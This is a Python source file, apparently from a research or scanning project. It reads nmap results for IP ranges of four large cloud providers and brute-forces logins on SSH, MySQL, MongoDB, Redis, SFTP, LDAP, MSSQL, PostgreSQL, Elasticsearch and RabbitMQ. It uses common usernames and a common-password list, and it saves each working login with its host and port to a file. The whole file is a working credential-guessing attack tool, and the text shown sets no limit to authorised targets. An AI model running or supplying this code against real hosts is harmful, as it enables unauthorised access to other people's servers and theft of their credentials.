import concurrent
import os
import socket
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool
import pandas as pd
import paramiko
import pymysql
import pymongo
import redis
import requests
import pysftp
from ldap3 import Server, Connection, ALL
import pyodbc
import psycopg2
from elasticsearch import Elasticsearch
from loguru import logger
import pika
from confluent_kafka import Producer
from tqdm import tqdm
from src.activeprobing.service_security_analysis.common_passwords import COMMON_PASSWORDS

common_usernames = ["root", "admin", "user", ""]
common_passwords = COMMON_PASSWORDS

def check_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0

def try_ssh(host, port, username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        logger.info(f"[+] SSH连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        ssh.close()


def try_mysql(host, port, username, password):
        conn = pymysql.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            connect_timeout=5
        )
        logger.info(f"[+] MySQL连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        conn.close()

def try_mongodb(host, port, username, password):
        client = pymongo.MongoClient(f"mongodb://{username}:{password}@{host}:{port}/", serverSelectionTimeoutMS=5000)
        client.server_info()
        logger.info(f"[+] MongoDB连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        client.close()


def try_redis(host, port, password):
        r = redis.Redis(host=host, port=port, password=password, socket_timeout=5)
        r.ping()
        logger.info(f"[+] Redis连接成功 - 端口: {port}, 密码: {password}")
        r.close()


def try_http(host, port):
        response = requests.get(f"http://{host}:{port}", timeout=5)
        logger.info(f"[+] HTTP连接成功 - 端口: {port}, 状态码: {response.status_code}")


def try_sftp(host, port, username, password):
        with pysftp.Connection(host=host, username=username, password=password, port=port) as sftp:
            logger.info(f"[+] SFTP连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")

def try_ldap(host, port, username, password):
        server = Server(host, port=port, get_info=ALL)
        conn = Connection(server, user=username, password=password)
        if conn.bind():
            logger.info(f"[+] LDAP连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        else:
            logger.error(f"[-] LDAP连接失败 - 端口: {port}, 用户名: {username}, 密码: {password}")

def try_mssql(host, port, username, password):
        conn = pyodbc.connect(f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={host},{port};DATABASE=master;UID={username};PWD={password}', timeout=5)
        logger.info(f"[+] MSSQL连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        conn.close()

def try_postgresql(host, port, username, password):
        conn = psycopg2.connect(host=host, port=port, user=username, password=password, connect_timeout=5)
        logger.info(f"[+] PostgreSQL连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        conn.close()

def try_elasticsearch(host, port, username, password):
        es = Elasticsearch([f'{host}:{port}'], http_auth=(username, password), timeout=5)
        if es.ping():
            logger.info(f"[+] Elasticsearch连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        else:
            logger.error(f"[-] Elasticsearch连接失败 - 端口: {port}, 用户名: {username}, 密码: {password}")

def try_rabbitmq(host, port, username, password):
        credentials = pika.PlainCredentials(username, password)
        connection = pika.BlockingConnection(pika.ConnectionParameters(host=host, port=port, credentials=credentials))
        logger.error(f"[+] RabbitMQ连接成功 - 端口: {port}, 用户名: {username}, 密码: {password}")
        connection.close()


def try_kafka(host, port):
        conf = {'bootstrap.servers': f'{host}:{port}'}
        producer = Producer(conf)
        producer.flush(timeout=5)
        logger.info(f"[+] Kafka连接成功 - 端口: {port}")



def save_success(host, port, service, username=None, password=None):
    with open("successful_scans.txt", "a") as f:
        if username is not None and password is not None:
            f.write(f"{service}://{username}:{password}@{host}:{port}\n")
        else:
            f.write(f"{service}://{host}:{port}\n")

def service_wrapper(args):
    host, port, service_func = args
    if check_port(host, port):
        logger.info(f"端口 {port} 开放")
        if service_func in [try_redis, try_http, try_kafka]:
            try:
                service_func(host, port)
                save_success(host, port, service_func.__name__[4:])
            except Exception as e:
                logger.error(f"[-] {service_func.__name__[4:]}连接失败 - 端口: {port}, 错误: {str(e)}")
        else:
            for username in common_usernames:
                for password in common_passwords:
                    try:
                        service_func(host, port, username, password)
                        save_success(host, port, service_func.__name__[4:], username, password)
                    except Exception as e:
                        logger.info(f"[-] {service_func.__name__[4:]}连接失败 - 端口: {port}, 用户名: {username}, 密码: {password}, 错误: {str(e)}")
    else:
        logger.info(f"端口 {port} 关闭")

def try_all(host, ports):
    ports = [int(port) for port in ports]



    services = {
        22: try_ssh,
        3306: try_mysql,
        27017: try_mongodb,
        6379: try_redis,
        80: try_http,
        443: try_http,
        2222: try_sftp,
        389: try_ldap,
        1433: try_mssql,
        5432: try_postgresql,
        9200: try_elasticsearch,
        5672: try_rabbitmq,
        9092: try_kafka
    }
    services = {port: service_func for port, service_func in services.items() if port in ports}

    # Create a pool of worker processes
    with Pool(processes=os.cpu_count() * 2) as pool:
        # Map the service_wrapper function to the list of services
        pool.map(service_wrapper, [(host, port, service_func) for port, service_func in services.items()])


def get_open_ports(huawei_scan_res_csv_path):
    # Read the CSV file
    huawei_scan_res = pd.read_csv(huawei_scan_res_csv_path)

    # Initialize a dictionary to store IP and open ports
    scan_dict = {}

    # Iterate through each row in the DataFrame
    for idx, row in huawei_scan_res.iterrows():
        host = row["ip"]
        open_ports = []

        # Check each port column
        for col in huawei_scan_res.columns:
            if row[col] == "open":
                port = int(col)
                open_ports.append(port)

        # Only add to scan_dict if there are open ports
        if open_ports:
            scan_dict[host] = open_ports

    return scan_dict
import concurrent.futures
from tqdm import tqdm


def process_host(item):
    host, ports = item
    try_all(host, ports)

def process_chunk(chunk):
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(chunk)) as executor:
        futures = [executor.submit(process_host, item) for item in chunk]
        concurrent.futures.wait(futures)

def chunk_dict(d, chunk_size):
    items = list(d.items())
    for i in range(0, len(items), chunk_size):
        yield items[i:i + chunk_size]

def main():
    from src.activeprobing.configs.path_config import (
        RESOURCES_NMAP_SCAN_RES_DIR_PATH,
        RESOURCES_IP_RANGES_DIR_PATH,
    )
    import pandas as pd

    aliyun_scan_res_csv_path = RESOURCES_NMAP_SCAN_RES_DIR_PATH / "aliyun_scan_res.csv"
    huawei_scan_res_csv_path = RESOURCES_NMAP_SCAN_RES_DIR_PATH / "huawei_scan_res.csv"
    amazon_scan_res_csv_path = RESOURCES_NMAP_SCAN_RES_DIR_PATH / "amazon_scan_res.csv"
    tencent_cloud_scan_res_csv_path = (
            RESOURCES_NMAP_SCAN_RES_DIR_PATH / "tencent_cloud_scan_res.csv"
    )

    scan_dict = get_open_ports(huawei_scan_res_csv_path)
    logger.info(f"Scanning {len(scan_dict)} IPs for huawei")
    max_workers = min(32, len(scan_dict))  # Use up to 32 workers or the number of hosts, whichever is smaller

    chunk_size = 100  # 每个chunk的大小，可以根据需要调整
    total_hosts = len(scan_dict)

    with tqdm(total=total_hosts, desc="Scanning Huawei") as pbar:
        for chunk in chunk_dict(scan_dict, chunk_size):
            process_chunk(chunk)
            pbar.update(len(chunk))

    scan_dict = get_open_ports(aliyun_scan_res_csv_path)
    logger.info(f"Scanning {len(scan_dict)} IPs for aliyun")
    with tqdm(total=len(scan_dict), desc="Scanning Aliyun") as pbar:
        for host, ports in scan_dict.items():
            try_all(host, ports)
            pbar.update(1)
    scan_dict = get_open_ports(amazon_scan_res_csv_path)
    logger.info(f"Scanning {len(scan_dict)} IPs for amazon")
    with tqdm(total=len(scan_dict), desc="Scanning Amazon") as pbar:
        for host, ports in scan_dict.items():
            try_all(host, ports)
            pbar.update(1)

    scan_dict = get_open_ports(tencent_cloud_scan_res_csv_path)
    logger.info(f"Scanning {len(scan_dict)} IPs for tencent cloud")
    with tqdm(total=len(scan_dict), desc="Scanning Tencent Cloud") as pbar:
        for host, ports in scan_dict.items():
            try_all(host, ports)
            pbar.update(1)


if __name__ == "__main__":
    main()